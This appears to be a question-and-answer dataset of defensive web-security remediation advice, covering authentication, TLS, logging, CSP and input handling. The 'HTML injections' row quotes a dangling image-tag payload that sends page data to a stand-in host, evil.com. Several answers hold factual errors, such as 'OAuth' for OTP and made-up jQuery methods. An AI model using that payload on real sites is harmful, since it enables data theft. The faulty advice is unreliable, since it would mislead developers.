How to resolve Forget password functions?,"The recommended solutions are to use TOTP (Timebased OneTime Password algorithm). This method is an example of a hashbased message authentication code (HMAC). It combines a secret key with the current timestamp using a cryptographic hash function to generate a onetime password. Because network latency and outofsync clocks can result in the password recipient having to try a range of possible times to authenticate against, the timestamp typically increases in 30second intervals, which thus cuts the potential search space.Or the other option is to use a Mathematicalalgorithmbased onetime password method. This other type of onetime password uses a complex mathematical algorithm, such as a hash chain, to generate a series of onetime passwords from a secret shared key. Each password cannot be guessed even when previous passwords are known. The open source OAuth algorithm is standardized; other algorithms are covered by U.S. patents. Each password is observably unpredictable and independent on previous ones. Therefore, an adversary would be unable to guess what the next password may be, even with the knowledge of all previous passwords.Example of a hard token mathimatical algorithm would be a yubikey Example of a soft token TOTP would be google authenticatorThe last resort would be to send a new password by email. This mail should contain a reset link with a token which is valid for a limited amount of time. Additional authentication based on softtokens (e.g. SMS token, native mobile applications, etc.) can be required as well before the link is sent over. Also, make sure whenever such a recovery cycle is started, the application does not reveal the user’s current password in any way."
How to resolve Aggregate access control protection?,The system should contain a counter which can keep up with the number of times a certain users addresses database tables and should be rejected when he passes a reasonable number. This violation should also be reported since it could indicate an attacker scraping your table contents and stealing company information.
How to resolve Canonicalized user input?,All userinput should be validated whenever the userinput string is complete and is being processed by your application.
How to resolve Approved random number generator?,"All random numbers, random file names, random GUIDs, and random must be generated using the cryptographic module's approved random number generator when these random values are intended to be unguessable/unpredictable by an attacker."
How to resolve Validated cryptographic modules?,Verify that cryptographic modules used by the application have been validated against FIPS 1402 or an equivalent standard.
How to resolve Policy for managing cryptographic keys?,"Verify that there is an explicit policy for how cryptographic keys are managed (e.g., generated, distributed, revoked, expired). Verify that this policy is properly enforced."
How to resolve HTTPS and weakly or unencrypted links?,Verify that credentials or other sensitive information is transported via TLS.
How to resolve Error handling on trusted devices?,Verify that all error handling is performed on trusted devices.
How to resolve Single application level logging?,Verify that there is a single applicationlevel logging implementation that is used by the software.
How to resolve Aggregate user requests?,"Verify the application has the ability to detect and alert on abnormal numbers of requests for information or processing highvalue transactions for that user role, automated use of web service extraction, or data loss prevention. For example, the average user should not be able to access more than 5 records per hour or 30 records per day or add 10 friends to a social network per minute."
How to resolve Principle of least privilege?,"The principle means giving a user account only those privileges which are essential to that user’s work. For example, a backup user does not need to install software: hence, the backup user has rights only to run backup and backuprelated applications. Any other privileges, such as installing new software, are blocked.The principle applies also to a personal computer user who usually does work in a normal user account, and opens a privileged, password protected account (that is, a superuser) only when the situation absolutely demands it.This principle can also be applied to your webapplications. Instead of solely depending on role based authentication methods using sessions, we rather want to assign privileges to users by means of a DatabaseBased Authentication system.We still use sessions in order to identify if the user was logged in correctly, only now instead of assigning that user with a specific role we assign him with privileges to verify which actions he is privileged to perform on the system.Also, a big pro of this method is, whenever a user has to be assigned fewer privileges your changes will be applied on the fly since the assigning does not depend on the session which otherwise had to expire first."
How to resolve TLS implementation must operate in an approved mode of operation?,See See http://csrc.nist.gov/groups/STM/cmvp/documents/fips1402/FIPS1402IG.pdf for more extended details on how to reach this goal.
How to resolve Character encoding?,"When trying to figure out the character encoding of a resource, user agents will try, in this order: The HTTP ContentType header sent by the server The XML declaration (only for XHTML documents) HTML/XHTML meta element.Make sure this information is provided by your application for the server in order to prevent it from guessing the wrong encoding standard, leaving room for injection. Note:These three ways of providing the character encoding of a document are not equivalent."
How to resolve HTTP request methods?,"Verify that the application accepts only a defined set of HTTP request methods, such as GET and POST and unused methods are explicitly blocked/disabled."
How to resolve Verbose version information?,"Verify that the HTTP headers do not expose detailed version information of system components. For each different type of server, there are hardening guides dedicated especially for this type of data leaking. The same applies for i.e any other leak of version information such as the version of your programming language or other services running to make your application function."
How to resolve HTTP headers added by a frontend?,Verify the integrity and authenticity of the HTTP headers added by a trusted proxy or SSO devices by checking the digital signature or by recalculating the hash or integrity method using a private key or passphrase.
How to resolve Session management control?,Always use the frameworks default session management control implementation in your application. If not possible you should find hardened guides in how to accomplish this in a secure manner.
How to resolve Available log analysis tools?,A list of recommended tools by OWASP you can find at https://www.owasp.org/index.php/Log_review_and_managementLogging_Tools
How to resolve Distinguish log?,Verify that log fields from trusted and untrusted sources are distinguishable in log entries. If possible it is highly recommended that you separate these files entirely from each other so the logs with untrusted userinput cannot corrupt the system generated logs.
How to resolve Sanitise sensitive data rapidly from memory?,Verify that sensitive data is rapidly sanitized from memory as soon as it is no longer needed and handled in accordance with functions and techniques supported by the framework/library/operating system.
How to resolve Logging is performed before executing the transaction?,"Verify that logging is performed before executing the transaction. If logging was unsuccessful (e.g. disk full, insufficient permissions) the application fails safe. This is for when integrity and nonrepudiation is a must."
How to resolve Verify integrity using checksums?,"Verify that the integrity of interpreted code, libraries, executables, and configuration files is verified using checksums or hashes (not MD5)."
How to resolve Deny access from remote resources or systems?,Since this is very difficult to achieve on application level we recommend implementing EGRESS firewall rules.
How to resolve Certificate paths revocation information?,"The trust anchor for given zone is found in the keyset<zone name> file on the secure signing computer in the same location where the signed and unsigned copies of the zone reside. This file is created automatically as part of the signing process. A certificate revocation list (CRL) is a list, created and signed by a certificate authority (CA), which contains serial numbers of certificates that have been issued by that CA and are currently revoked. In addition to the serial number of the revoked certifications, the CRL also contains the reason for revocation for each certificate and the time the certificate was revoked. The serial number for each revoked certificate is kept in the CAs database and published in the CRL until the certificate expires.After the revoked certificate is expired, the certificates entry in the CRL is removed and the CA may remove the certificate from its database. Typically, the revoked certificate will remain in the CRL for one publication period after the certificate expires. By all times you should have this information in reach in order to take quick actions."
How to resolve HTML Caching and client side caching?,Never store sensitive information in a client side cache since this can be easily compromised by attackers. The same principle does also apply to autocomplete functions.Recommended knowledge base item: Caching headers Client side storage
How to resolve Cryptographic modules should operate in their approved mode according to their published security policies?,Always verify that cryptographic modules operate in their approved mode according to their published security policies before implementing them into your application.
How to resolve Sending data parameters to untrusted devices?,"Verify the application minimizes the number of parameters sent to untrusted systems, such as hidden fields, Ajax variables, cookies and header values.These untrusted devices should also be documented if possible and should be taken into account when developing your application to minimize the possibility you send unintended sensitive data towards these devices.Recommended knowledge base items: Highlevel architecture should be defined Identify all application components"
How to resolve Proces high value business logic flows in a trusted environment?,"Verify the application processes or verifies all highvalue business logic flows in a trusted environment, such as on a protected and monitored server."
How to resolve Data from untrusted sources?,Verify the application code does not execute uploaded data obtained from untrusted sources. You could consider sandboxing this data when showing the content on your application.NOTE: Sandboxing however does not stop an XXE attack. So it is highly recommended to also encode or escape all data entering your application from third party sources.
How to resolve User restriction for sensitive data?,"Whenever sensitive data is stored on the server store the data in a separate folder with permission rules in order to prevent unauthorized users from reading the files. As an indepth solution, you could also check if the session of the user has sufficient privileges to read the files according to the level of authorization. Recommended knowledge base item: • Missing authentication or authorization • Sanitize sensitive data rapidly from memory"
How to resolve Runtime environment?,"There are a number of runtime solutions that can detect stack corruption and buffer overruns or guard against attacks. These solutions typically terminate the program when an anomaly is detected, preventing the execution of arbitrary code."
How to resolve Automatic parameter binding?,When working with automatic variable binding you should create whitelists of what parameters are expected and allow only these parameters to be passed into your application operation.
How to resolve Cryptographic function implementation?,Verify that all cryptographic functions used to protect secrets from the application user are implemented server side.
How to resolve Cryptographic modules must fail securely?,We recommend using the National Institute of Standards and Technology (NIST) standard on testing the cryptographic module making it perform the selftests to see if it fails securely.
How to resolve Access to any master secret must be protected from unauthorized access?,Whenever sensitive data is stored on the server you should consider storing this data in a separate folder with permission rules in order to prevent unauthorized users from reading these files. It is also highly recommended to encrypt/hash the password in order to enforce higher security.
How to resolve Enforce policys for sensitive data processing?,"First, you have to create a list which contains locations of where all sensitive data is used and processed. Next, you create a policy that tells who is allowed and to what extent they have privileges to look into which data. When this data moves through the network it should always be encrypted (TLS) and also be stored encrypted. Thereafter you should establish monitoring and testing methods to verify that everything stays encrypted and your policies are properly enforced. Also, determine whenever data storage is necessary or becomes a redundancy. Whenever sensitive data does not have to be stored don't store it. This reduces the quantity of data may your application ever be compromised. Ultimately, verify accessing sensitive data is logged, if the data is collected under relevant data protection directives or where logging of accesses is required. Sensitive data or primary keys, such as personally identifiable information or credit cards should also be anonymized, masked or truncated on the server before transmission to the client."
How to resolve Access control pattern?,"It is highly recommended to study all the listed items and implement these principles in your access control/login system in order to enforce a higher level of security.1. Audit logs 2. Principle of least privilege (Privilege based authentication system) 3. Passwords must be encrypted, salted and stretched 4. CrossSite Request Forgery (CSRF for authenticated forms) 5. Session pattern 6. Session fixation 7. Session hijacking 8. Forget password functions 9. Client side authentication 10. Client side state management 11. Cross subdomain cookie attack"
How to resolve Password forget pattern?,"The first thing is verify the password has been forgotten and other recovery paths send a link including a timelimited activation token rather than the password itself. Additional authentication based on softtokens (e.g. SMS token, native mobile applications, etc.) can be required as well before the link is sent over. Second, you should not lock out the user’s account whilst the process of getting a new password is in progress. This could lead to a Denial of service attack whenever an attacker decides to intentionally lock out the users with an automated attack. Third, whenever the new password request was set in progress, the message you display should be generalized in order to prevent username enumeration. Fourth, always disallow the use of old passwords and implement a strong password policy."
How to resolve Sessions pattern?,"The items as pointed out before should be looked into and taken into consideration whenever you are working with sessions on your system in order to enforce a high level of security.Though there are more than ten design patterns related to session, all of them need to be implemented. If any one is left out for implementation, the whole session management layer is not secure and could be defeated by attackers."
How to resolve Submit forms pattern?,"Here are the steps described briefly. For more detailed information you should look into these items in the knowledge base.First, you should create a single user input validation control class which should validate the expected input values in order to verify if the user is not tampering data or is injecting malicious code into your application. All infringements should be logged and repercussions should be taken whenever these infringements are frequent.Second, whenever an authenticated user is submitting the form always ensure the forms contain CSRF tokens in order to prevent crosssite request forgery. Third, Whenever there are authenticated users with different roles/privileges you should enforce restrictions on the server side upon your form submits/processing in order to prevent privilege escalation. You should apply the principle of least privilege in order to ensure a higher level of security. Fourth, Whenever the application is sending sensitive data through the form submit this data must always be sent through a POST variable instead of a GET since a GET will leak this data through the URL by example the referrer header."
How to resolve SQL injection Column truncation?,"On critical places where unique values are enforced and expected, such as usernames in order to authorize or distribute certain privileges. The users submit should be checked on the server side in order to verify if it does not exceed the limit set in your database."
How to resolve User registration pattern?,"The items as pointed out before should be looked into and taken into consideration whenever you are letting users register on your system in order to enforce a high level of security.Here are the steps described briefly. For more detailed information you should look into these items in the knowledge base.First, You enforce limits on the length of the users submits on the server side in order to prevent him from truncating his submits. These limits have to correlate with the limits you set in your column in the database.Second, you should create a single user input validation control class which should validate the expected input values in order to verify if the user is not tampering data or injecting malicious code into your application. All infringements should be logged and repercussions should be taken whenever these infringements are frequent.Third, never display the user’s password on a screen anywhere.Fourth, Whenever you generate a password for your users, this password should always be randomized sufficiently.Fifth, encrypt your passwords by proven cryptographic standards when storing them.Sixth, Enforce secure passwords by implementing good password policies."
How to resolve Cross subdomain cookie attack?,In this scenario changing the sessionID on login does not make any difference since Alice is already logged in when she visits Mallory's evil web page.It is good practice to use a completely different domain for all trusted activity.For example Google uses google.com for trusted activities and *.googleusercontent.com for untrusted sites.Also when setting your cookies to specify which domains they are allowed to be send to. Especially on your trusted domain you do not want to leak cookies to unintended subdomains. highly recommended is to not use wildcards when setting this option.
How to resolve HTML injections?,"1.Content spoofing Otherwise known as ""Content Injection"" or ""Virtual Defacement"" occurs whenever an attacker can inject code into your application. It is very important to sanitize and or encode user data before you display it on screen as HTML.2.Image tag injection occurs whenever an attacker injects a broken image tag with a nonterminated parameter like: ""img src='http://evil.com?steal.php?value= Every content after value= parameter will now be stolen and send to evil.com by the attacker till the injection finds the next occurrence of a matching single quote. Again you should sanitize and encode the user input to prevent an image tag from being injected in your application. For whenever a user is permitted to submit an image on your application enforce and verify the application accepts valid nonbroken tags only.3.The ""form"" tag can't be nested. The toplevel occurrence of this element always takes precedence over subsequent appearances. Again you must avoid this type by properly encoding and sanitizing your userinputs.4.Whenever an attacker injects a ""base"" tag into your application it can steal data because the tag specifies the base URL/target to where to process the data to. The solution to base jumping would be to use absolute paths in your application such as action='/update_profile.php' instead of: action='update_profile.php'5/6 can both also easily be prevented simply be encoding or sanitizing your userinput submitted towards your application. Always validate your user input on a high level(serverside constraint). Whenever your application expects an integer you should validate and check whether the user submitted input really is what you expected it to be and otherwise, you terminate and log the request."
How to resolve RFD and file download injections?,"First, never use user input directly into your headers since an attacker can now take control over it.Secondly, you should check if a filename really does exist before presenting it towards the users. You could also create a whitelist of all files which are allowed to be downloaded and terminate requests whenever they do not match.Also, you should disable the use of ""path parameters"". It increases the attacker’s attack vector and these parameters also cause a lot of other vulnerabilities. And last you should sanitize and encode all your userinput as much as possible. Reflective file downloads depend on userinput being reflected in the response header. Whenever this input has been sanitized and encoded it should not do any harm to any system it is being executed on"
How to resolve identify all application components?,"Verify that all application components (either individual or groups of source files, libraries, and/or executables) that are present in the application are identified.When you identified these components you may want to map and document them in order to have a quick reference to this infrastructure when needed."
How to resolve Identify external dependencies?,"First, you must identify which external dependencies your application relays on for its operation. Second, there should be a failsafe implemented should this dependency ever fail to deliver its services towards your application."
How to resolve High level architecture should be defined?,"Verify that a highlevel architecture for the application has been defined. This means some sort of a technical resign has to be composed of this architecture and all the elements it provides. This gives a visual representation of your application and makes it easier to work through.While you are mapping your application architecture you should also add all other components your application contains in terms of business functions and/or security functions they provide.When you map these components it becomes more transparent about different types of security mitigations that might be forgotten for some of your business functions. Because again, you now own a visual representation of this logic. Your application also becomes more manageable in terms of keeping up with the latest security updates and patches and gives you a better view of obsolete configurations, functions, and components which can be removed from the system."
How to resolve Threat modeling?,"Threat modeling is best applied continuously throughout a software development project. The process is essentially the same at different levels of abstraction, although the information gets more and more granular throughout the lifecycle. Ideally, a highlevel threat model should be defined in the concept or planning phase, and then refined throughout the lifecycle. As more details are added to the system, new attack vectors are created and exposed. The ongoing threat modeling process should examine, diagnose, and address these threats.Note that it is a natural part of refining a system for new threats to be exposed. For example, when you select a particular technology such as Java for example you take on the responsibility to identify the new threats that are created by that choice. Even implementation choices such as using regular expressions for validation introduce potential new threats to deal with.More indepth information about threat modeling can be found at: https://www.owasp.org/index.php/Application_Threat_Modeling"
How to resolve Differential analysis attack?,"Verify that all authentication challenges, whether successful or failed, should respond in the same average response time. This same methodology applies for other sensitive information that could potentially be recovered with differential attacks."
How to resolve Client side input validation?,"First, there must be a client side input validation method as you would apply to the server side. This means you should also apply input rejection as well as typecasting and such. This is to prevent users from being attacked by XSS attacks which are undetectable by the server.Recommended knowledge base items: Positive validation method Single input validation controls Input rejection Input validation"
How to resolve Positive validation model?,First there must be a client side input validation method as you would apply to the server side. This means you should also apply input rejection as well as typecasting and such. This is to prevent users from being attacked by XSS attacks which are undetectable by the server.
How to resolve TLS certificate public key pinning?,"The idea is to reuse the existing protocols and infrastructure, but use them in a hardened manner. For reuse, a program would keep doing the things it used to do when establishing a secure connection.To harden the channel, the program would take advantage of the OnConnect callback offered by a library, framework or platform. In the callback, the program would verify the remote host's identity by validating its certificate or public key. While pinning does not have to occur in an OnConnect callback, it is often most convenient because the underlying connection information is readily available.For more extended information on different types of implementation please see: https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning"
How to resolve HSTS preload?,"In order to be included on the HSTS preload list, your site must:1. Have a valid certificate (which must expire before 2016 if it uses SHA1). 2. Redirect all HTTP traffic to HTTPS—i.e. be HTTPS only. 3. Serve all subdomains over HTTPS, specifically including the www subdomain if a DNS record for that subdomain exists. 4. Serve an HSTS header on the base domain: * Expiry must be at least eighteen weeks (10886400 seconds). * The includeSubdomains token must be specified. * The preload token must be specified. * If you are serving a redirect, that redirect must have the HSTS header, not the page it redirects to.For more details on HSTS, please see RFC 6797. Note that the preload flag in the HSTS header is required to confirm and authenticate your submission to the preload list. An example valid HSTS header: StrictTransportSecurity: maxage=10886400; includeSubDomains; preloadAdding your website to the list: https://www.chromium.org/hsts Source: https://wiki.mozilla.org/Privacy/Features/HSTS_Preload_List"
How to resolve Forward secrecy ciphers?,"In the beginning SSL handshake, the client sends a list of supported cipher suites (among other things). The server then picks one of the cipher suites, based on a ranking, and tells the client which one they will be using.This step is the one that determines whether or not the future connection will have perfect forward secrecy. Note that, at this point, certificates have not entered the picture at all. This is because whether or not a connection has perfect forward secrecy is determined by how the session key is derived. And how the session key is derived is determined by the cipher suite in use. So, the cipher suites that use ephemeral DiffieHellman (DHE) or the elliptic curve variant (ECDHE) will have perfect forward secrecy while the other options will not."
How to resolve OCSP stapling?,"Stapling basically means that the certificate holder queries the OCSP server themselves at regular intervals, obtaining a signed timestamped OCSP response. When the site's visitors attempt to connect to the site, this response is included (""stapled"") with the TLS/SSL Handshake via the Certificate Status Request extension response (note: the TLS client must explicitly include a Certificate Status Request extension in its ClientHello TLS/SSL handshake message). While it may appear that allowing the site operator to control verification responses would allow a fraudulent site to issue false verification for a revoked certificate, the stapled responses can't be forged as they need to be directly signed by the certificate authority, not the server. If the client does not receive a stapled response, it will just contact the OCSP server by itself. However, if the client receives an invalid stapled response, it will abort the connection. The only increased risk of OCSP stapling is that the notification of revocation for a certificate may be delayed until the lastsigned OCSP response expires.For more detailed information about Specification, Deployment, and limitation visit: https://en.wikipedia.org/wiki/OCSP_stapling"
How to resolve STRIDE?,"The STRIDE was initially created as part of the process of threat modelling. STRIDE is a model of threats, used to help reason and find threats to a system. It is used in conjunction with a model of the target system that can be constructed in parallel. This includes a full breakdown of processes, data stores, data flows and trust boundaries.Today it is often used by security experts to help answer the question ""what can go wrong in this system we're working on?"""
How to resolve File inclusion attack?,"The most effective solution to eliminate file inclusion vulnerabilities is to avoid passing usersubmitted input to any filesystem/framework API. If this is not possible the application can maintain a white list of files, that may be included on the page, and then use an identifier (for example the index number) to access the selected file. Any request containing an invalid identifier has to be rejected, in this way, there is no attack surface for malicious users to manipulate the path.Also, disable the opportunity for the application to load remote resources. This is mostly achieved by adding a server configuration file such as php.ini or web.xml"
How to resolve Access management?,"Verify that access to administration and management functions within the Web Service Application is limited to web service administrators.For example, they could only be accessible from within a restricted source IP range."
How to resolve JSON XML schema?,Verify that XML or JSON schema are in place and verified before accepting input.
How to resolve Limiting user input size?,Verify all the user input has been limited and the application only accepts expected input lengths
How to resolve Parsing data exchange formats?,"We highly recommend doing your own escaping, sanitizing, encoding on all data before entering your application. The risk also depends on the context of wherever you are putting this data into. So before you are doing any mutations with your data after getting it from the resources, make sure you have applied the right mitigations.Also, another reason to build an extra layer of escaping, sanitizing, encoding routines in your application is for the logging you want to apply on the data. Recommended knowledge base items: Input rejection Input validation Audit logs"
How to resolve Content security policy headers?,"A best practice for implementing CSP in your application would be to externalize all JavaScript within the web pages.So this: ``` <script> function doSomething() { alert('Something!'); } </script> <button onclick='doSomething();'>foobar!</button> ``` Must become this: ``` <script src='doSomething.js'></script> <button id='somethingToDo'>Let's foobar!</button> ``` The header for this code could look something like: ``` ContentSecurityPolicy: defaultsrc'self'; objectsrc'none'; scriptsrc'https://mycdn.com' ``` Since it is not entirely realistic to implement all JavaScript on external pages we can apply sort of a crosssite request forgery token to your inline JavaScript. This way the browser can again distinguish the difference between code which is part of the application against probable malicious injected code, in CSP this is called the 'nonce'. Of course, this method is also very applicable on your existing code and designs. Now, to use this nonce you have to supply your inline script tags with the nonce attribute. Firstly, it's important that the nonce changes for each response. Otherwise, the nonce would become guessable. So it should also contain a high entropy and should be hard to predict. Similar to the operation of the CSRF tokens, the nonce becomes impossible for the attacker to predict making it difficult to execute a successful XSS attack. Inline JavaScript example containing nonce: ``` <script nonce=sfsdf03nceI23wlsgle9h3sdd21> <! Your javscript code > </script> ``` Matching header example: ``` ContentSecurityPolicy: scriptsrc 'noncesfsdf03nceI23wlsgle9h3sdd21' ``` There is a whole lot more to learn about the CSP header for indepth implementation in your application. This knowledge base item just scratches the surface and it would be highly recommended to gain more indepth knowledge about this powerful header Very Important: When applying the CSP header, although it blocks XSS attacks. Your application still remains vulnerable to HTML and other code injections. So this is not a substitute for, validation, sanitizing and encoding of userinput."
How to resolve Safe javascript jquery methods?,"Below we listed some safe functions for whenever it is needed to supply your JavaScript/jquery functions with userinput.JQUERY functions: .txt(); .val(); .parse();Example: ```` <script> function myFunction() { $( ""p"" ).text( ""append userinput to paragrapgh safely"" ); } </script> Javscript functions: .innerText(); < not supported by firefox .textContext(); < not supported on I.E 8 and lower .createTextNode(); .value(); ``` Example: ``` <script> function myFunction() {  var t = document.createTextNode(""append userinput to body safely"");  document.body.appendChild(t); } </script> ```"
How to resolve WYSIWYG editors?,Download a HTML sanitizer and configure it to your specific needs. When configuring the sanitizer make sure you disable all unused components. The less options an attacker has to insert into your application the less his attack surface becomes. Also before implementing this HTML sanitizer on a production environment have it first thoroughly examined by security testers since it is a very delicate function.
How to resolve Parsing JSON with Javascript?,For the purpose of parsing JSON we would recommend the use of the json.parse functionality. Even though this function is more trusted you should always build your own security checks and encoding routines around the json.parse before mutating the data or passing it on to a view to be displayed in your HTML.
How to resolve Account lockout?,"Soft lockout: This can be a good option for protecting your users against brute force attacks. For example, whenever the user enters a wrong password three times, the application could lock down the account for a minute in order to slow down the process of brute forcing his password making it less profitable for the attacker to proceed. If u were to implement hard lockout countermeasures for this example you would achieve a ""Dos"" by permanently locking out accounts.Hard lockout: This type of lockout should be applied whenever you detect a user attacking your application and counter him by means of permanently locking out his account until a response team had time to do their forensics. After this process you can decide to give the user back his account or take further legal actions against him. This type of approach prevents the attacker from further penetrating your application and infrastructure.Note: Be cautious that a softlockout countermeasure does not override a hardlockout status."
How to resolve XML attacks?,Items listed below are recommended to read whenever you are planning to use XML in your application.Recommended knowledge base items: XML injection External DTD parsing XSLT injections XPath injections XXE injections
How to resolve Centralized security controls?,Make sure all your different type of security controls have a centralized place of implementation. Also verify that error handling logic in security controls denies access by default.
How to resolve Data controller display layer separation?,"Make sure your different type of data layers are separated in your application.The separation of these different layers is also know as a design pattern which goes by the name MVC (model, view, controller)."
How to resolve Proven authentication mechanisms?,Verify authentication mechanisms in the application are proven and verified against ASVS.
How to resolve Administrative interfaces must not be accessible to untrusted parties?,The first solution is to grant access only from a certain source IP range to the administrative interface. If that solution would not be possible then it is always recommended to enforce a stepup or adaptive authentication for logging in into the administrative interface.Recommended knowledgebase item: Step up or adaptive authentication
How to resolve Concurrent session handling?,"The application should keep track and limit all the granted sessions. It should store your users IP address, session id and user id. After storing these credentials it should do regular checks to see if there are:1. Multiple active sessions linked to same user id 2. Multiple active sessions from different locations 3. Multiple active sessions from different devices 4. Limit and destroy sessions when they exceed an accepted threshold.The more critical the application becomes the lower the accepted threshold for concurrent sessions should be."
How to resolve Auto escaping technology?,"Whenever autoescaping functionality in your application has been disabled for whatever reason, you should make sure there is other protection in place like a HTML sanitizer in order to prevent attackers from injecting malicious code into your application."
How to resolve Client side storage?,"Verify that authenticated data is cleared from client storage, such as the browser DOM, after the session is terminated. This also goes for other session and local storage information which could assist an attacker launching an successful attack.Verify that data stored in client side storage (such as HTML5 local storage, session storage, IndexedDB, regular cookies or Flash cookies) does not contain sensitive data or PII (personal identifiable information)."
How to resolve Log rotation and seperation?,"Log rotation is an automated process used in system administration in which dated log files are archived. Servers which run large applications, such as LAMP stacks, often log every request: in the face of bulky logs, log rotation is a way to limit the total size of the logs while still allowing analysis of recent events.Log separation basically means that you have to store your log files on a different partition as where your OS/application is running on in order to avert a Denial of service attack or the downgrading of your application its performance."
How to resolve HTTP strict transport security?,"When users are visiting the application it should set the following header: These headers should be set in a base class which always sets the header no mather what page the users initially visit.Simple example, using a long (1 year) maxage: StrictTransportSecurity: maxage=31536000If all present and future subdomains will be HTTPS: StrictTransportSecurity: maxage=31536000; includeSubDomains CAUTION: Site owners can use HSTS to identify users without cookies. This can lead to a significant privacy leak.Cookies can be manipulated from subdomains, so omitting the include ""includeSubDomains"" option permits a broad range of cookierelated attacks that HSTS would otherwise prevent by requiring a valid certificate for a subdomain. Ensuring the ""Secure Flag"" is set on all cookies will also prevent, some, but not all, of the same attacks."
How to resolve API resonses security headers?,"Sanitize your API's input (in this case they should just allow alphanumeric); escaping is not sufficientVerify that all API responses contain XContentTypeOptions: nosniff, to prevent the browser from interpreting files as something else than declared by the content type (this helps prevent XSS if the page is interpreted as html or js).Add 'ContentDisposition: attachment; filename=""filename.extension""' with extension corresponding the file extension and contenttype, on APIs that are not going to be rendered"
How to resolve Do not support untrusted client side technologies?,"Do not use Flash, ActiveX, Silverlight, NACL, clientside Java or other client side technologies not supported natively via W3C browser standards."
How to resolve Signed message payloads?,"Verify that the message payload is signed to ensure reliable transport between client and service, using JSON Web Signing or WSSecurity for SOAP requests."
How to resolve Hardware key vault?,"Verify that all consumers of cryptographic services do not have direct access to key material. Isolate cryptographic processes, including master secrets and consider the use of a hardware key vault (HSM)."
How to resolve SOAP basic profile?,"Verify that the SOAP based web services are making use of the WSI Basic profile. To be compliant with this standard, it essentially means the application infrastructure must be TLS protected.Source: http://www.wsi.org/Profiles/SimpleSoapBindingProfile1.0.html"
How to resolve Strong CRYPTO through CA hierachy?,"Verify that only strong algorithms, ciphers, and protocols are used, through all the certificate hierarchy, including root and intermediary certificates of your selected certifying authority. Because this is always in flux werecommend using the: SSLlabs free test https://www.ssllabs.com/ssltest/ OWASP OSAFT : https://www.owasp.org/index.php/OSaftThese TLS hardening recommendations can then be applied on all servers."
How to resolve Build and deploy in a secure fashion?,"Building your application should always be done on a server that you trust, you are in control and has the latest security patches and hardening configured. For deploying the application the same rules apply, also think about what type of third party services can access the code or modify it. Creating scripts to monitor for bad behavior of a third party service can be an option as an extra quality control check."
How to resolve Signed application components?,Create for the different components in the application signed signatures and verify these in the application at starting of the application and at runtime level.
How to resolve Build proccess security hardening?,"Ensure that build processes for system level languages have all security flags enabled, such as ASLR, DEP, and other security checks specific for your application need."
How to resolve Sanitize unstructured data?,"Unstructured data needs to be sanitized to enforce generic safety measures for example: allowed characters character length,Also some characters are potentially harmful in given context and thus should be escaped. (e.g. natural names with Unicode or apostrophes, such as &x306D;&x3053; or O'Hara)"
How to resolve Zero keys and secrets before destroying them?,"Secrets and keys should be erased from the memory and zeroed when they are no longer needed to prevent attackers from doing memory dumping attacks.Also take into consideration the different Garbage collectors of your programming language. Whenever you zero out the keys of secret in question, you have no guarantee that a copy of it doesn't exist elsewhere in memory."
How to resolve Keys and passwords should be replaceable?,Verify in the application and components it uses that it's possible to replace the used keys and passwords. Also replace default keys and passwords after the installation of the application.
How to resolve Enforce random numbers are created with proper entropy at runtime?,"Enforce in your application that random numbers are created with proper entropy even when the application is under heavy load, or that the application degrades gracefully in such circumstances."
How to resolve Segregated components?,"Verify that components are segregated from each other via a defined security control, such as network segmentation, firewall rules, or cloud based security groups."
How to resolve PII protection?,Personally Identifiable Information needs to be stored encrypted at rest and ensure that all communication goes via protected channels like SSL/TLS.
How to resolve Verify application is not vulnerable for known security issues?,"Verify that all application components, libraries, modules, frameworks, platform, and operating systems are free from known vulnerabilities.This could be achieved with for example, strict patch management and periodic scanning of the environment for new issued CVEs'. It is also highly recommended to run the applications libraries and modules in the SDLC through tools like OWASP dependency check. This tool checks imported modules and libraries for known CVEs' https://www.owasp.org/index.php/OWASP_Dependency_Check"
How to resolve Disable autocomplete for all the input fields in forms?,"The browser should explicitly be told for all the input fields that the autocomplete function should be turned off. The ""autocomplete=off"" HTML attribute should be added to all the input and hidden input fields in the form you want to disable the autocomplete of."
How to resolve All time sources should be synchronized?,"Time sources should be synchronized to ensure logs have the correct time. If these time sources are not synchronized, the logs lose integrity and can become untrusted for investigators."
How to resolve Generate strong crypto tokens with at least 120 bit of effective entropy?,Authentication tokens should always be generic and should be cryptographically random strong with at least 120 bit of effective entropy. The best way to implement these tokens is to go with proven methods that are tested on the effective level of entropy.For example JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and selfcontained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed. JWTs can be signed using a secret (with the HMAC algorithm) or a public/private key pair using RSA.
